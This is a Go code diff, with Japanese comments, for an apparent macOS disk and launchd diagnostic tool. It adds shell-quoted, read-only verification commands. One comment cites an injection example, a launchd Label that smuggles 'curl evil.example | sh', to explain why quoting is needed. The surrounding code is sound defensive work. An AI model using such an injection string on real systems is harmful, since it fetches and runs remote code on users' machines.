@@ -851,6 +851,58 @@ func diskCopyPath(r disk.Result) string {
 }
 
 // diskCopyText は Y でコピーする解説文。別セッションの LLM に「これは消していいか」を聞ける形にする。
+// diskVerifyCommands は「なぜこの候補が出たか」を人が自分で確かめるコマンド (issue 183)。
+//
+// なぜ要るか: `Y` のコピー文は「別セッションの LLM にそのまま投げられる形」と定義されている
+// (issue 148 の ④ 追加要件)。判定・合計・復元方法だけ渡すと、受け手は**判定を鵜呑みにするしかない**。
+//
+// 🚨 **パスは必ず `svc.ShellQuote` を通す**。`Item.Path` も Container 名も攻撃者が置ける値で、
+// 引用しないと doctor 自身が提示するコマンドがインジェクションを運ぶ (issue 178 / 193 が塞いだ穴を
+// 新設することになる。`svc.manualCommands` が Label に対して同じ規律を持つ)。
+//
+// ⚠️ ここに**既存の出力と重複するコマンドを足さない**。`diskCopyText` は各 Item のサイズ・
+// 最終更新・合計・`Contents` を既に出しているので、`du -sk` や `stat -f %Sm` は情報を増やさない
+// (2026-09-03 の反証レビュー)。
+// ⚠️ `orphan-container` に **`mdfind` を出さない**。カタログの Detail が
+// 「Info.plist を実走査して突合 (mdfind は使わない)」と明記した手段で、
+// 裏取り用でも載せると否定された判定材料を復活させる (同レビュー)。
+func diskVerifyCommands(r disk.Result) []string {
+	q := svc.ShellQuote
+	switch r.Entry.ID {
+	case "simulator-runtimes":
+		return []string{"xcrun simctl runtime list -j"}
+	case "coresimulator-orphan":
+		// 出力の中に候補の UUID があれば現存 = 孤児ではない
+		return []string{"xcrun simctl list devices -j"}
+	case "orphan-container":
+		return []string{"ls /Applications ~/Applications"}
+	case "brew-orphan-state", "brew-cleanup-residue":
+		// 実装の台帳は 1 つ (brewledger)。svc 側の C 判定と同じコマンドに揃える
+		return []string{"brew list --formula", "brew cleanup --dry-run"}
+	case "versionmanager-orphan-root":
+		return []string{"echo $RBENV_ROOT $NODENV_ROOT $GOENV_ROOT", "rbenv root"}
+	case "xctest-logarchive", "xctest-spindump", "launchd-tmp":
+		// boottime より古いものだけを候補にしている。起動時刻を見れば判定を追える
+		return []string{"sysctl kern.boottime"}
+	case "finder-nsird", "swiftui-drag-cache":
+		// どちらも「コピー元が残っているか」を人が見る必要がある (Recover がそう言っている)。
+		// サイズではなく中身を見るので ls を出す
+		var out []string
+		for _, it := range r.Items {
+			out = append(out, "ls -la "+q(it.Path))
+			if len(out) >= maxVerifyCommands {
+				break
+			}
+		}
+		return out
+	}
+	return nil
+}
+
+// maxVerifyCommands はコピー文に載せる裏取りコマンドの上限 (Items が多いエントリで
+// コピー文が読めない長さになるのを防ぐ)。
+const maxVerifyCommands = 5
+
 func diskCopyText(r disk.Result, mark string) string {
 	var b strings.Builder
 	fmt.Fprintf(&b, "glogx doctor (ディスク診断) の候補: %s [%s]\n", r.Entry.Label, r.Entry.ID)
@@ -878,6 +930,12 @@ func diskCopyText(r disk.Result, mark string) string {
 	for _, c := range r.Contents {
 		fmt.Fprintf(&b, "  中身: %s\n", c)
 	}
+	if cmds := diskVerifyCommands(r); len(cmds) > 0 {
+		b.WriteString("この判定を自分で確かめるコマンド (読み取りのみ):\n")
+		for _, c := range cmds {
+			fmt.Fprintf(&b, "  %s\n", c)
+		}
+	}
 	return b.String()
 }
 
@@ -895,6 +953,33 @@ func svcUndiagnosedCopyText(u svc.Undiagnosed) string {
 }
 
 // svcCopyText は Y でコピーする解説文 (壊れた launchd 登録)。
+// svcVerifyCommands は壊れた登録の判定を人が確かめるコマンド (issue 183)。読み取りのみ。
+//
+// ⚠️ `f.Commands` (= `svc.manualCommands`) と混ぜない。あちらは `launchctl bootout` / `rm` の
+// **破壊コマンド**で、「消してよいか確かめる」ためのものではない。コピー文では見出しを分ける。
+//
+// 🚨 パスと Label は `svc.ShellQuote` を通す (Label は plist が決める任意文字列で、
+// `evil; curl evil.example | sh #` が実走査で成立する。`manualCommands` と同じ規律)。
+// 🚨 ドメインは `f.Domain` を使う。`gui/$(id -u)/` の決め打ちは **system ドメインで誤り**
+// (`svc.Annotations` が「system は launchctl list に出ない」と明記している)。
+func svcVerifyCommands(f svc.Finding) []string {
+	q := svc.ShellQuote
+	out := []string{
+		"plutil -p " + q(f.PlistPath),
+		"launchctl print " + q(f.Domain+"/"+f.Label),
+	}
+	if f.MissingExec != "" { // A: 実行ファイルが本当に無いか
+		out = append(out, "ls -l "+q(f.MissingExec))
+	}
+	if f.HasLastExit { // B: 起動状態を自分で見る
+		out = append(out, "launchctl list | grep "+q(f.Label))
+	}
+	if f.BrewFormula != "" { // C: 台帳に無いか (実装の台帳と同じコマンド)
+		out = append(out, "brew list --formula | grep "+q(f.BrewFormula))
+	}
+	return out
+}
+
 func svcCopyText(f svc.Finding) string {
 	var b strings.Builder
 	fmt.Fprintf(&b, "glogx doctor (サービス診断) の候補: %s\n", f.Label)
@@ -911,7 +996,11 @@ func svcCopyText(f svc.Finding) string {
 	if f.BrewFormula != "" {
 		fmt.Fprintf(&b, "Homebrew formula: %s\n", f.BrewFormula)
 	}
-	b.WriteString("手動で実行するコマンド (ツールは実行しない):\n")
+	b.WriteString("この判定を自分で確かめるコマンド (読み取りのみ):\n")
+	for _, c := range svcVerifyCommands(f) {
+		fmt.Fprintf(&b, "  %s\n", c)
+	}
+	b.WriteString("消すと決めたら手動で実行するコマンド (ツールは実行しない):\n")
 	for _, c := range f.Commands {
 		fmt.Fprintf(&b, "  %s\n", c)
 	}
